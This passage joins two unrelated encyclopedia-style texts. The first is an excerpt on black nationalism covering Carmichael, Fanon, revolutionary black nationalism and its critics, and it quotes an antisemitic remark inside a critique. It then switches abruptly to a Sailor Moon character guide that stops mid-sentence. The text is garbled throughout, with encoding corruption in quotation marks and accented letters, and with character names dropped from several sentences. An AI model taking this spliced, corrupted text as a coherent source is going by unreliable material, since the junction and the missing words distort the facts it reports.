illustrates the prosperity of the black race in the United States as being dependent on the implementation of black sovereignty. Under his theory, black nationalism in the United States would allow blacks to socially, economically and politically be empowered in a manner that has never been plausible in America history. A black nation would work to reverse the exploitation of the black race in America, as blacks would intrinsically work to benefit their own state of affairs. African Americans would function in an environment of running their own businesses, banks, government, media and so on and so forth. Black nationalism is the opposite of integration, and Carmichael contended integration is harmful to the black population. As blacks integrate to white communities they are perpetuating a system in which blacks are inferior to whites. Blacks would continue to function in an environment of being second class citizens, he believes, never reaching equity to white citizens. Stokley Carmichael uses the concept of black nationalism to promote an equality that would begin to dismantle institutional racism. =Frantz Fanon= While in France, Frantz Fanon wrote his first book, Black Skin, White Masks, an analysis of the impact of colonial subjugation on the African psyche. This book was a very personal account of Fanon's experience being black: as a man, an intellectual, and a party to a French education. Although Fanon wrote the book while still in France, most of his other work was written while in North Africa (in particular Algeria). It was during this time that he produced The Wretched of the Earth where Fanon analyzes the role of class, race, national culture and violence in the struggle for decolonization. In this work, Fanon expounded his views on the liberating role of violence for the colonized, as well as the general necessity of violence in the anti-colonial struggle. Both books established Fanon in the eyes of much of the Third World as one of the leading anti- colonial thinkers of the 20th century. In 1959 he compiled his essays on Algeria in a book called L'An Cinq: De la R√©volution Alg√©rienne. Revolutionary Black Nationalism Revolutionary Black nationalism is an ideology that combines cultural nationalism with scientific socialism in order to achieve Black self-determination. Proponents of the ideology argue that revolutionary Black nationalism is a movement that rejects all forms of oppression, including class based exploitation under capitalism. Revolutionary Black nationalist organizations such as the Black Panther Party and the Revolutionary Action Movement also adopted a set of anti-colonialist politics inspired by the writings of notable revolutionary theorists including Frantz Fanon, Mao Zedong and Kwame Nkrumah. In the words of Ahmad Muhammad (formerly known as Max Stanford) the national field chairman of the Revolutionary Action Movement: > ‚ÄúWe are revolutionary black nationalist[s], not based on ideas of national > superiority, but striving for justice and liberation of all the oppressed > peoples of the world. . . . There can be no liberty as long as black people > are oppressed and the peoples of Africa, Asia and Latin America are > oppressed by Yankee imperialism and neo-colonialism. After four hundred > years of oppression, we realize that slavery, racism and imperialism are all > interrelated and that liberty and justice for all cannot exist peacefully > with imperialism.‚Äù Professor and author Harold Cruse saw revolutionary Black nationalism as a necessary and logical progression from other leftist ideologies, as he believed that non-Black leftists could not properly assess the particular material conditions of the Black community and other colonized people: > ‚ÄúRevolutionary nationalism has not waited for Western Marxian thought to > catch up with the realities of the \\"underdeveloped\\" world...The liberation > of the colonies before the socialist revolution in the West is not orthodox > Marxism (although it might be called Maoism or Castroism). As long as > American Marxists cannot deal with the implications of revolutionary > nationalism, both abroad and at home, they will continue to play the role of > revolutionaries by proxy.\\" Criticism Norm R. Allen, Jr., former director of African Americans for Humanism, calls black nationalism a \\"strange mixture of profound thought and patent nonsense\\". > On the one hand, Reactionary Black Nationalists (RBNs) advocate self-love, > self-respect, self-acceptance, self-help, pride, unity, and so forth - much > like the right-wingers who promote \\"traditional family values.\\" But - also > like the holier-than-thou right-wingers - RBNs promote bigotry, intolerance, > hatred, sexism, homophobia, anti-Semitism, pseudo-science, irrationality, > dogmatic historical revisionism, violence, and so forth. Allen further criticizes black nationalists' strong \\"attraction for hardened prisoners and ex-cons\\", their encouragement of violence when other African- American individuals or groups are branded as \\"Toms,\\" traitors, or \\"sellouts\\", the blatantly sexist stance and the similarities to white supremacist ideologies: > Many RBNs routinely preach hate. Just as white supremacists have referred to > African Americans as \\"devils,\\" so have many RBNs referred to whites. White > supremacists have verbally attacked gays, as have RBNs. White supremacists > embrace paranoid conspiracy theories, as do their African counterparts. Many > white supremacists and RBNs consistently deny that they are preaching hate, > and blame the mainstream media for misrepresenting them. (A striking > exception is the NOI's Khallid Muhammad, who, according to Gates, admitted > in a taped speech titled \\"No Love for the Other Side\\": \\"Never will I say I > am not anti-Semitic. I pray that God will kill my enemy and take him off the > face of the planet.\\") Rather, they claim they are teaching \\"truth\\" and > advocating the love of their own people, as though love of self and hatred > of others are mutually exclusive positions. On the contrary, RBNs preach > love of self and hatred of their enemies. (Indeed, it often seems that these > groups are motivated more by hatred of their enemies than love of their > people.) Tunde Adeleke, Nigerian-born professor of History and Director of the African American Studies program at the University of Montana, argues in his book UnAfrican Americans: Nineteenth-Century Black Nationalists and the Civilizing Mission that 19th-century African-American nationalism embodied the racist and paternalistic values of Euro-American culture and that black nationalist plans were not designed for the immediate benefit of Africans but to enhance their own fortunes. Black feminists in the U.S., such as Barbara Smith, Toni Cade Bambara, and Frances Beal, have also lodged sustained criticism of certain strands of black nationalism, particularly the political programs advocated by cultural nationalists. Black cultural nationalists envisioned black women only in the traditional heteronormative role of the idealized wife-mother figure. Patricia Hill Collins criticizes the limited imagining of black women in cultural nationalist projects, writing that black women \\"assumed a particular place in Black cultural nationalist efforts to reconstruct authentic Black culture, reconstitute Black identity, foster racial solidarity, and institute an ethic of service to the Black community.\\" A major example of black women as only the heterosexual wife and mother can be found in the philosophy and practice called Kawaida exercised by the Us Organization. Maulana Karenga established the political philosophy of Kawaida in 1965. Its doctrine prescribed distinct roles between black men and women. Specifically, the role of the black woman as \\"African Woman\\" was to \\"inspire her man, educate her children, and participate in social development.\\" Historian of black women's history and radical politics, Ashley Farmer, records a more comprehensive history of black women's resistance to sexism and patriarchy within black nationalist organizations, leading many Black Power era associations to support gender equality.

The series takes place in Tokyo, Japan, where the , a group of ten magical girls, are formed to combat an assortment of antagonists attempting to take over the Earth, the Solar System, and the Milky Way galaxy. Each Guardian undergoes a transformation which grants her a uniform in her own theme colors and a unique elemental power. The ten Sailor Guardians are named after the planets of the Solar System, with the exception of Earth but including its moon. While many of the characters are humans with superhuman strength and magical abilities, the cast also includes anthropomorphic animals and extraterrestrial lifeforms. The series follows the adventures of the titular protagonist, Sailor Moon, her lover Tuxedo Mask, and her guardians: Sailors Mercury, Mars, Jupiter, and Venus. They are later joined by Chibiusa (Sailor Moon and Tuxedo Mask's daughter from the future) and four more guardians: Sailors Pluto, Uranus, Neptune, and Saturn. The series' antagonists include the Dark Kingdom, the Black Moon Clan, the Death Busters, the Dead Moon Circus, and Shadow Galactica. Takeuchi's initial concept was a story called Codename: Sailor V, in which Sailor V discovers her magical powers and protects the people of Earth. After the Codename: Sailor V manga was proposed for an anime adaptation, Takeuchi changed her concept to include ten superheroines who defend the galaxy. The manga's anime, live-action, musical, and video game adaptations feature some original characters created by the production staff and not by Takeuchi. Creation and conception Naoko Takeuchi initially wrote Codename: Sailor V, a one-shot manga which focused on Sailor Venus. When Sailor V was proposed for an anime adaptation by Toei Animation, Takeuchi changed the concept to include Sailor Venus as a part of a \\"sentai\\" (team of five) and created the characters of Sailors Moon, Mercury, Mars, and Jupiter. The name \\"Sailor Senshi\\" comes from sailor fuku, a type of Japanese school uniform that the main characters' fighting uniforms are based on, and the Japanese word senshi, which can mean \\"soldier\\", \\"warrior\\", \\"guardian\\", or \\"fighter\\". Takeuchi created the term by fusing English and Japanese words. The DIC Entertainment/Cloverway English adaptation of the anime changed it to \\"Sailor Scout\\" for most of its run. According to Takeuchi, only females can be Sailor Guardians. In the anime's fifth season, the Sailor Starlights are depicted as men transforming into women when changing from their normal forms into Sailor Guardians, rather than just being women disguising as men as they appear in the manga. Takeuchi wanted to create a series about girls in outer space, and her editor, Fumio Osano, suggested that Takeuchi add the \\"sailor suit\\" motif to the uniform worn by the Sailor Guardians. Takeuchi settled on a more unified appearance in later stages of character design. Among the protagonist Sailor Guardians, Sailor Venus (during her time as Sailor V) has the only outfit that varies significantly from the others. Sailor Moon, whatever form she takes, always has a more elaborate costume than any of the others. She also gains individual power-ups more frequently than any other character. Sailor Guardians originating from outside the Solar System have different and varying outfits; however, one single feature ‚Äì the sailor collar ‚Äì connects them all. Most of the antagonists in the series have names that are related to minerals and gemstones, including Queen Beryl and the Four Kings of Heaven, the Black Moon Clan, Kaolinite and the Witches 5, and most of the members of the Dead Moon Circus. Members of the Amazoness Quartet are named after the first four asteroids to be discovered. The Sailor Animamates have the prefix \\"Sailor\\" (despite not being true Sailor Guardians in the manga), followed by the name of a metal and the name of an animal. Main characters The Sailor Guardians as seen in Sailor Moon Crystal (season 3) =Sailor Moon= is the main protagonist of the series and leader of the Sailor Guardians. Usagi is a careless fourteen-year-old girl with an enormous capacity for love, compassion, and understanding. Usagi transforms into the heroine called Sailor Moon, the Guardian of Love and Justice. At the beginning of the series, she is a self-described immature crybaby who resents fighting evil and wants nothing more than to be a normal girl. As the story progresses, however, she embraces the chance to use her power to protect those she cares about. =Tuxedo Mask= is a student who is older than Usagi. When he was a young child, Mamoru was in a car accident that killed his parents and erased his memories. He and Usagi share a special psychic connection, and he can sense when she is in danger. This inspires him to take on the guise of Tuxedo Mask and fight alongside the Sailor Guardians when needed. After an initially confrontational relationship, he and Usagi remember their past lives together and fall in love again. =Sailor Mercury= is a quiet but intelligent fourteen-year-old bookworm in Usagi's class with a rumored IQ of 300. She can transform into Sailor Mercury, the Guardian of Water and Wisdom. Ami's shy exterior masks a passion for learning and taking care of the people around her. She hopes to eventually become a doctor like her mother, and tends to be the practical one in the group. She is secretly a fan of pop culture and romance novels, and becomes embarrassed whenever this is pointed out. Ami also uses her handheld computer, which is capable of scanning and detecting virtually anything about which she requires information. =Sailor Mars= is an elegant fourteen-year-old miko (). Because of her work as a Shinto priestess, Rei has limited precognition and can dispel or nullify evil using special ofuda scrolls, even in her civilian form. She transforms into Sailor Mars, the Guardian of Fire and Passion. She is very serious and focused, and easily becomes annoyed by Usagi's laziness, although she cares about her very much. In the anime adaptation, Rei is portrayed as boy-crazy and short-tempered, while in the manga and live-action series she is depicted as uninterested in romance and more self-controlled. She attends a private Catholic school separate from the other girls. =Sailor Jupiter= is a fourteen-year-old girl who is a student in Usagi Tsukino's class and was rumoured to have been expelled from her previous school for fighting. Unusually tall and strong for a Japanese schoolgirl, she transforms into Sailor Jupiter, the Guardian of Thunder and Courage. Both of Makoto's parents died in a plane crash years ago, so she lives alone and takes care of herself. She cultivates her physical strength and domestic interests, including housekeeping, cooking, and gardening. Makoto excels at hand-to-hand combat. Her dream is to marry a young handsome man and to own a flower-and- cake shop. =Sailor Venus= is a fourteen-year-old perky dreamer. Minako first appears as the main protagonist of Codename: Sailor V. She has a companion cat called Artemis who works alongside Luna in guiding the Sailor Guardians. Minako transforms into Sailor Venus, the Guardian of Love and Beauty, and leads Sailor Moon's four inner Guardians, while acting as Sailor Moon's bodyguard and decoy because of their near-identical looks. She dreams of becoming a famous singer and idol, and attends auditions whenever she can. In contrast, in the live-action series, she is a successful J-pop singer (of whom Usagi, Ami, and Makoto are fans) and has poor health due to her anemia, choosing to isolate herself from the other Guardians as a result. =Sailor Chibi Moon= is the future daughter of Neo-Queen Serenity and King Endymion in the 30th century. She later trains with Sailor Moon to become a Sailor Guardian in her own right, and learns to transform into Sailor Chibi Moon (or \\"Sailor Mini Moon\\" in the English series). At times she has an adversarial relationship with her mother in the 20th century, as she is more mature than Usagi, but as the series progresses they develop a deep bond. Chibiusa wants to grow up to become like her mother. =Sailor Pluto= is a mysterious woman who appears first as Sailor Pluto, the Guardian of Spacetime and Change. She has the duty of guarding the Space-Time Door from unauthorized travelers. Only later does she appear on Earth, living as a college student. She has a distant personality and can be very stern, but can also be quite friendly and helps the Sailor Guardians when she can. After her long vigil guarding the Space- Time Door she carries a deep sense of loneliness, although she is close friends with Chibiusa. Chibiusa calls her by her nickname \\"Puu\\". Sailor Pluto's talisman is her Garnet Rod, which aids her power to attack and temporarily stop time. =Sailor Uranus= is a good-natured tomboyish girl who is a year older than most of the other Sailor Guardians. She is able to transform into Sailor Uranus, the Guardian of Sky and Flight. Before becoming a Sailor Guardian, she aspired to become a race car driver, and she has excellent driving skills. She tends to dress and, in the anime, speak like a man. When fighting the enemy she distrusts outside help and prefers to work solely with her girlfriend, Sailor Neptune, and later Sailors Pluto and Saturn. Sailor Uranus's talisman, known as the Space Sword, aids her fighting. =Sailor Neptune= is an elegant and talented violinist and painter with family money of an age with her partner and lover, Haruka Tenoh. She is able to transform into Sailor Neptune, Guardian of Ocean and Embrace. She worked alone for some time before finding her partner, Sailor Uranus. Neptune ultimately gave up her own dreams and became fully devoted to her duty as a Sailor Guardian, and is willing to make any sacrifice for it. Sailor Neptune's talisman is her Deep Aqua Mirror, which aids her intuition and reveals cloaked evil. =Sailor Saturn= is a sweet and lonely young girl. A laboratory accident in her youth significantly compromised her health. After overcoming the darkness that has surrounded her family, Hotaru is able to become Sailor Saturn, Guardian of Silence, Destruction, and Rebirth. She is often pensive, and as a human has the inexplicable power to heal others. Sailor Saturn's weapon is her Silence Glaive, which gives her the power to generate barriers and destroy a planet. When she uses that power, she kills herself but is reborn afterwards by Sailor Moon. Antagonists =Dark Kingdom= The are the first set of antagonists the Sailor Guardians encounter in the first arc of the manga and all its adaptions. Established by Queen Beryl, its members mostly consist of brainwashed reincarnations of residents from the fictional Golden Kingdom of Earth whose mission is to gather human energy and find the Silver Crystal in order to reawaken Queen Metaria, the evil entity responsible for the destruction of both the Silver Millennium of the Moon and the Golden Kingdom. =Hell Tree aliens= The Hell Tree aliens are a minor group of antagonists that appear in the first thirteen episodes of Sailor Moon R. Ail and Ann wandered space for many years before reaching Earth, where they collect energy to revive the Hell Tree so that it can give them energy to survive. Unlike other antagonists of the series, their mission was primarily that of survival, not conquest or destruction. In some English adaptations of the anime, their name is changed to \\"Doom Tree aliens\\". Ail and Ann and are two humanoid aliens who pose respectively as and , siblings who transfer to Usagi's school. While trying to blend in, Ail acts as Ann's brother. He develops a crush on Usagi, and constantly tries to win her over, much to Ann's dismay. He constantly denies these feelings to Ann, knowing her tendency to have fits of jealous rage. Ann develops a crush on Mamoru, and constantly tries to win him over, much to the dismay of Ail and Usagi. Ail and Ann are the only two of their kind. Hikaru Midorikawa voiced Ail in the original series, and Yumi T≈çma voiced Ann. In the DIC English version, Alan is voiced by Vince Corazza and Ann by Sabrina Grdevich. In the Viz Media English version, Ail is voiced by Brian Beacock and Ann by Dorothy Elias-Fahn. The Hell Tree The is an alien tree that nourishes Ail and Ann. The tree lived alone on an island in a vast ocean on a faraway planet. The tree then created life and gave energy to its many children, until the children became greedy and fought each other until the planet was destroyed, with the tree and two small children, Ail and Ann, as the only survivors. The tree became weak and required energy to stay alive. Ail and Ann supply it with human energy to revive it but this stops working. The tree becomes angered and starts to injure those around it, killing Ann in the process. Sailor Moon uses her power to purify the Tree and resurrect Ann. Ali and Ann are left with a reborn tree in the form of a small sapling. The two of them leave Earth to live a better life with the Tree. The Hell Tree was voiced in Japanese by Taeko Nakanishi. In the DIC English adaptation, the Doom Tree was voiced by Elizabeth Hanna. In the Viz Media English adaptation, she is voiced by Erin Fitzgerald. Cardians The are monsters of the day used by Ail and Ann to obtain energy to revive the Hell Tree. The Cardians are kept in cards until they are summoned by Ail. To summon them, Ail would hold up several cards, and Ann would pick one. The card would then rise into the air and Ail would play a tune on his flute which causes the Cardian to come alive. When a Cardian is destroyed, it changes back into its card form and the picture of the Cardian on the card turns black. =Black Moon Clan= The are the main antagonists in the \\"Black Moon\\" arc of the manga and its adaptations. Led by Prince Demand and based on planet Nemesis, which provides them with the Malefic Black Crystal, the Black Moon Clan are a terrorist group from the 30th century whose desire to end the reign of Neo-Queen Serenity is manipulated by the mysterious Wiseman. =Death Busters= The are the main antagonists in the \\"Infinity\\" arc of the manga and its adaptions. Initially led by Kaolinite and Professor Souichi Tomoe before the resurrection of their true leader Mistress 9, the Death Busters consist of human-alien hybrids seeking to bring the alien creature Pharaoh 90 to terraform Earth. =Dead Moon Circus= The are the main antagonists in the \\"Dream\\" arc of the manga and in Sailor Moon SuperS. Led by Zirconia, members of the Dead Moon Circus seek for the Golden Crystal to release their ruler Queen Nehelenia from her mirror prison and take over the Earth. =Shadow Galactica= are the main antagonists of the final arc of the manga and most episodes of Sailor Moon Sailor Stars. Shadow Galactica is an organization of corrupted Sailor Guardians led by Sailor Galaxia, who devote themselves to stealing Star Seeds, the essence of sentient life, from inhabitants of the Milky Way. Their ultimate goal is to reorganize the universe as desired by Chaos, the true main antagonist of the series. Supporting characters =Luna, Artemis, and Diana= The series includes three different cat characters who act as advisors to their respective owners. Each has the power of speech, and bears a crescent moon symbol on his or her forehead. The two older cats, Luna and Artemis, lived in the Moon Kingdom, millennia before the main plot, and acted as advisors to Queen Serenity; the third, Diana, is much younger and was born on Earth. The cats serve as mentors and confidantes, and a source of information and new tools and special items. They are shown to have additional human forms, a deeper backstory, and an unrequited love or two. Although Luna takes the largest role of the three, Artemis was the first of the cats to appear; he figures prominently in Codename: Sailor V, the manga series which preceded Sailor Moon. In Act 46 of the manga, the three are attacked by Sailor Tin Nyanko, a false Guardian from their home planet Mau (named after the Chinese word \\"Ë≤ì\\", meaning \\"cat\\"). Artemis terms it a peace-loving world, but Tin Nyanko informs him that its people were wiped out by Sailor Galaxia after he and Luna left it. Tin Nyanko blasts all three of them on their crescent moon symbols, and they turn into ordinary cats, unable to speak. Later, as they care for the badly injured cats, Princess Kakyuu tells Usagi that the three of them have powerful Star Seeds, as brilliant as Sailor Crystals. In Act 48, they are brought to the River Lethe and killed by Sailor Lethe. They are reincarnated at the end of the series along with everyone else.Luna and Artemis return and give birth to Diana in the future. In the live-action series, Luna and Artemis are portrayed as stuffed toys rather than real cats. Usually they are represented by a puppet, though CGI effects are used for complicated scenes. Writer Mary Grigsby considers the cat characters to blend pre-modern ideas about feminine mystery with modern ideas such as the lucky cat. Luna is a black cat who is a devoted servant to Princess Serenity and advisor to her mother, Queen Serenity. When the kingdom falls, she and Artemis are put into a long sleep and sent to Earth to look after the Sailor Guardians, who are reborn there. Parts of Luna's memory are suppressed so that she must find the Sailor Guardians. She first encounters Usagi Tsukino and teaches her to become Sailor Moon, unaware that she is actually the reincarnated Princess Serenity. Luna also provides the Guardians with many of their special items. Over the course of the series, Luna develops a close bond with Usagi, though it is initially on uneasy terms, as Luna often upsets Usagi by giving her unsolicited advice. She also becomes good friends with Ami Mizuno. She and Artemis have an implied romantic relationship, which is confirmed when they meet Diana, who is their daughter from the future. In Sailor Stars, Luna also develops a crush on Kou Yaten, one of the Three Lights. In \\"The Lover of Princess Kaguya\\", a side- story of the manga, she falls in love with a human named Kakeru. This story was adapted in Sailor Moon S: The Movie, and features Luna's first transformation into a human. She gets a cold and tries to find her way home despite Artemis' plea to go with her. She ends up lying in the street until Kakeru saves her from becoming roadkill. In Act 27 of the live-action series, Luna gains the ability to turn into a young human girl, going by the name Luna Tsukino while able to become a Sailor Guardian known as \\"Sailor Luna\\". She is shown living as a human with Usagi's family, with whom she gets along quite well, but still takes on her cat form when necessary. Her personality as a human girl is identical to her normal self and is easily overwhelmed by her feline nature, but she is also shown to have taken on some of the personality traits of Usagi and her mother, such as acting in the same melodramatic manner when waking up in the morning. Takeuchi designed the character of Sailor Luna. Luna's human form is portrayed by Rina Koike, who thought that she was going to play Chibiusa until she went in for a costume fitting. Luna is voiced by Keiko Han in the anime television series and the live-action series, and by Ry≈ç Hirohashi in all media following Sailor Moon Crystal. In the DIC/Cloverway English adaptation, she is voiced by Jill Frappier, who portrayed the character with an English accent, described as \\"fairly old, not to mention cranky and British\\". Her role in the series has been compared to Rupert Giles's in Buffy the Vampire Slayer. In the Viz Media English adaptation, her voice is supplied by Michelle Ruff. Artemis is the white cat companion to Minako Aino. Artemis trains her to become Sailor V, and remains by her side when she takes on her proper role as Sailor Venus. He first guides Usagi Tsukino through the Sailor V video game at the Crown Game Center arcade without revealing his true identity. In the anime, when a technical problem reveals him, Luna is greatly annoyed to learn that he has been the one guiding her all along. Later, he fills Luna in on the details of her true mission. In the Sailor V manga and the live-action series, Artemis gives special items to the Guardians, although unlike Luna he does not seem to produce them himself. He does not seem to mind the fact that he is named after a female goddess, even when teased about it by Minako. Artemis is more easy-going than Luna, and has a \\"big brother\\" relationship with Minako, although an attraction to her is sometimes implied. He also cares very deeply about Luna, often comforting her when she is distressed and stating his admiration of her. In addition, he is a good father to Diana, as evidenced by her affection for him. In the original Japanese series, Artemis is voiced by Yasuhiro Takato in Sailor Moon and by Yohei Obayashi in Crystal. In the live-action series, he is voiced by Kappei Yamaguchi. He appears in the first Sailor Moon musical, played by a cat-suited Keiji Himeno. In the DIC/Cloverway English adaptation, he is voiced by Ron Rubin. In the Viz Media English adaptation, he is voiced by Johnny Yong Bosch. Diana is the future daughter of Luna and Artemis. She first appears when the Sailor Guardians travel to the 30th century in the Black Moon arc. After defeating Death Phantom, the Sailor Guardians return to the 20th century and Diana joins them. In the anime, she first appears in Sailor Moon SuperS, calling Artemis her father, to Luna's initial dismay. Only later it is revealed that Diana has come from the future and that her mother is Luna. Just as Luna and Artemis guide Usagi and Minako, Diana acts as a guardian to Chibiusa. She is very curious, eager to help, and deeply polite, always addressing Usagi and Mamoru with the Japanese honorific and calling Chibiusa by her formal title, Small Lady. She is able to help the Sailor Guardians on occasion, despite her youth, and often because of the knowledge she had gained in the future. Diana is voiced by Kumiko Nishihara in the first series, and by Shoko Nakagawa in Crystal. In the Cloverway English adaptation, she is voiced by Loretta Jafelice in the series, and by Naomi Emmerson in Sailor Moon SuperS: The Movie. In the Viz Media English adaptation, she is voiced by Debi Derryberry. In one of her reviews of Sailor Moon Crystal, IGN writer Meghan Sullivan admitted that the scene in which Diana tells Sailor Pluto to go and help Chibiusa and the Sailor Guardians while she guards the Door of Time and Space made her tear up, stating: \\"Here was this tiny cat - who by her own admission has no powers and is too small to fight, offering to help however she could. It's moments like these that remind me why I love Sailor Moon so much.\\" =Sailor Starlights= The are a group of Sailor Guardians composed of Sailor Star Fighter, Sailor Star Maker, and Sailor Star Healer; in civilian form they go by the pseudonyms Kou Seiya, Kou Taiki, and Kou Yaten, respectively. They come from the fictional planet , whose princess, Princess Kakyuu, left the planet to escape Sailor Galaxia's assault and to heal her wounds. The Starlights abandon Kinmoku and track Kakyuu to Earth and then Japan, where the Starlights disguise themselves as a male pop star group called and embed their music with a telepathic broadcast in order to attract Kakyuu's attention. The Three Lights all attend J≈´ban High School along with Usagi and her friends. Eventually, on their way to the Galaxy Cauldron, they are killed by Galaxia's henchwomen Sailor Chi and Sailor Phi. In the anime, the Starlights were given a major role. The trio are male in their civilian forms, becoming women when transforming into Sailor Guardians, as opposed to their manga counterparts who are women that disguise themselves as men in their civilian forms. As Starlights, they distance themselves from the other Sailor Guardians, deeming that Earth is not their responsibility. The Starlights survive several direct battles with Galaxia herself, and help Sailor Moon defeat Chaos to save Galaxia. Takeuchi expressed surprise at Toei Animation's decision to make the Starlights lead characters in the anime adaptation, but was even more shocked by their treatment of the Starlights' sex. In the Italian dub, instead of changing sex, there were six people ‚Äì the Three Lights were always men, and simply summoned their twin sisters instead of transforming, as the original depiction was very controversial in Italy. The Starlights are featured in several of the Sailor Moon musicals (Sailor Stars, Eien Densetsu, and their revised editions, plus Ryuusei Densetsu and Kakyuu-Ouhi Kourin). While played by women, it is meant to be ambiguous as to whether they take on male forms or cross-dress, though their personalities reflect the former. Their story also combines elements from both the manga and the anime; for instance, they travel to the Galaxy Cauldron as they do in the manga, but survive the battles against Galaxia as they do in the anime. The pairings with the Sailor Guardians from the anime are also featured in some musicals. Their exact relationship to each other is unknown; according to the manga they are not siblings. Their surname \\"Kou\\" (ÂÖâ) translates to \\"light\\", among other things, making the name \\"Three Lights\\" a pun. In the original English manga, \\"Kou\\" was translated to \\"Lights\\" and was used as their shared family name. Sailor Star Fighter is the leader of the Starlights as and the lead vocalist for the Three Lights. In general, Seiya acts arrogant and tends to be, at least on the surface, confident in his/her own abilities. Seiya becomes the star player of their local high-school American football team and the school's star athlete, upsetting Haruka Tenoh, who was the school's previous star athlete on the track and field team. Eventually, she raises the suspicions of the Sailor Guardians as to her identity. In the anime, Taiki and Yaten consider him prone to bouts of childishness (such as when he shows off his basketball skills in front of the school), but generally follow his lead. Seiya develops strong feelings for Usagi; his attempts to forge a bond with her provide the primary romantic tension of the season. Seiya calls Usagi odango, like Mamoru does. The two go on a date at an amusement park, which is interrupted when Sailor Iron Mouse attacks. Seiya makes his interest in her clear when they spend time together practicing softball, telling her, \\"I like your light.\\" However, Seiya's feelings are not fully reciprocated and he/she acknowledges the one-sided romance. The relationship between Sailor Star Fighter and Princess Kakyuu is slightly ambiguous. In the anime, when he daydreams of his home planet, he thinks lovingly of an image of his princess, which is suddenly superimposed by an image of Usagi, much as Usagi had seen Seiya's image overlaid by Mamoru in previous episodes. In the image poem released for his CD single, however, he suggests that his feelings for her are because he is \\"carrying the heart of a boy\\" and because he was attracted to her light. Seiya's responsibilities in the band are lead vocals, guitar, and lyrics. they were once seen in the anime angrily playing the drums in their hideout because they think their princess has not heard them yet. According to Takeuchi, when she created this character it was meant to be a combination between Haruka and Mamoru, and was modeled after Jenny Shimizu. In the original Japanese version of the anime series, they were voiced by Shiho Niiyama in one of her final roles before her death. In English, their voice is provided by Melissa Hutchison. In the musicals, Seiya has been portrayed by Sayuri Katayama, Chinatsu Akiyama and Meiku Harukawa. Sailor Star Maker , better known as , is the most intellectual of the trio. Their abilities rival that of Ami Mizuno, though they consider her romantic notions foolish. In the anime, Ami's appeal for them to see the good in dreaming does begin to have an effect, however. In combat with a phage, Star Maker is the first of the Starlights to willingly allow Sailor Moon to heal the monster rather than trying to kill it themselves, because it had been a teacher who Ami respected. Later in the series, as they are beginning to lose hope in finding Princess Kakyuu, they visit a sick girl named Misa in the hospital. She shows them a drawing of the Princess that she sees when she listens to the Three Lights' song. With renewed hope, Taiki returns to the Three Lights. In the anime, they sometimes wear glasses. Like Yaten, Taiki believes that Seiya should stay away from Usagi after learning she is Sailor Moon, despite their wish, shared by Princess Kakyuu and the Sailor Guardians, for them all to work together. However, their views on Usagi change for the better near the end of Sailor Stars. They are the most cool-headed of the trio. Taiki's responsibilities in the band are background vocals, keyboards, and composition. They also enjoy poetry and belongs to the literature club at school. Taiki is meant to be a more-distant Setsuna Meioh. In the original Japanese version of the anime series, they were voiced by Narumi Tsunoda. In English their voice is provided by Erika Harlacher. In the musicals, Taiki has been portrayed by Hikari Ono, Akiko Nakayama, and Riona Tatemichi. Sailor Star Healer , better known as , is a lonely person who does not like to socialize or play sports. Their remarks are often sharp-edged and blunt, which further separates them from the world. At one point, the other Starlights even chastise Yaten for behaving in a way that might reduce the number of fans. Yaten does not interact with the people around them much, wanting to focus on the mission. Yaten is egotistical and nurses grudges, and hates injury. However, they and Luna get along well. Yaten has the most spiritual awareness of the Starlights, and is able to tell when Star Seeds are taken by Galaxia. They view humans as untrustworthy and wants to find Princess Kakyuu so they can leave Earth as quickly as possible. When they discover that Usagi is Sailor Moon, Yaten believes that Seiya should stay away from Usagi, despite their wish, shared by Princess Kakyuu and the Sailor Guardians, for them all to work together. Their view is shared by Taiki as well as Sailors Uranus, Neptune, and Pluto. However, also like Taiki, their views on Usagi change for the better near the end of Sailor Stars. In the anime, Yaten is shown to be physically stronger than Makoto Kino in their civilian forms. Yaten's responsibilities in the band are background vocals, bass guitar, and song arrangement. They also enjoy photography but does not belong to any school club, preferring to just go home. In the original Japanese version of the anime series, Yaten was voiced by Chika Sakamoto. In English, their voice is provided by Sarah Anne Williams. In the musicals, Yaten has been portrayed by Momoko Okuyama, Mikako Tabe, and Saki Matsuda. =Other humans= Asanuma, Kotono, Motoki, Reika; (middle) Shingo, Momoko, Kyusuke; (right) Ikuko, Kenji, Naru, Umino, Sorano. Ikuko Tsukino is the mother of Usagi. She is often seen cooking and lecturing Usagi for her grades in school. They are shown to be close, since she gives Usagi advice on relationships of all kinds, and eagerly accepts her relationship with Mamoru. She cares for Chibiusa when she is present, whom she believes to be her niece, but who in truth is her future granddaughter. She also cares for Chibi-Chibi, whom she believes to be her second daughter. Ikuko's name and design are modeled after Takeuchi's mother. In the live-action series, Ikuko is portrayed as an extremely outgoing, quirky, and determined person. She changes her hairstyle almost every day, is constantly trying out new (and questionable) omelette recipes, and loves nothing more than being in the spotlight. She is a high-school friend with Minako's manager, and it is said the two of them were big participants in their school's theater program. In the original Japanese series, Ikuko is voiced by Sanae Takagi in the first anime and by Yuko Mizutani in Crystal until her death in 2016. In the DIC and Cloverway English dubs, she is voiced by Barbara Radecki. In the Viz Media English dub, her voice is supplied by Tara Platt. Kaori Moriwaka portrays Ikuko in the live- action series. Kenji Tsukino is Usagi's father, a stereotypical well- meaning Japanese salaryman, who works as a magazine reporter and later as an editor-in-chief. Kenji is quite affectionate with his wife. Early on, he becomes jealous when he sees Usagi with Mamoru Chiba, thinking he is too old for her. Like his wife, Kenji is entirely unaware of Usagi's real identity. He senses a maturity in his daughter when she is finally aware of her status as Princess Serenity, and notes that at times her beauty seems serene. Kenji appears less frequently after the anime adaptation's second season. In the live-action series, he never appears in the main body of the series, which is explained by his always being away on business trips. He appears briefly in the direct-to-DVD Special Act, crying at Usagi's wedding. In the anime series, Kenji is voiced by Yuji Machi in the first series and by Mitsuaki Madono in Crystal. In the DIC/Cloverway English adaptation, he is voiced by David Huband. In the Viz Media English adaptation, he is voiced by Keith Silverstein. In the Special Act of the live-action series, he is portrayed by series director Ryuta Tasaki. Shingo Tsukino is the younger brother of Usagi, making her the only Sailor Guardian with a known sibling. His influence in her life is alternately helpful and mocking; he considers her well-meaning, but also considers her an accident-prone crybaby. Though unaware of his sister's true identity, Shingo is impressed by the media-hyped urban legends of Sailor Moon and Sailor V. He is a particularly enthusiastic fan of Sailor Moon because she rescued him from Dark Kingdom forces early in her career. He enjoys video games and is a diligent student. Shingo's favorite book is Shonen J*mp (a reference to the manga anthology Weekly Sh≈çnen Jump), and he likes to play games on the Famicom. In the anime, Shingo appears in several episodes of the first season, but is less frequently seen afterwards. In the live-action series, Shingo dislikes much of what his sister and mother do, and does not care about much of life in general. In the video game Sailor Moon: Another Story, Shingo is kidnapped by the villains in an attempt to force Usagi to hand over the 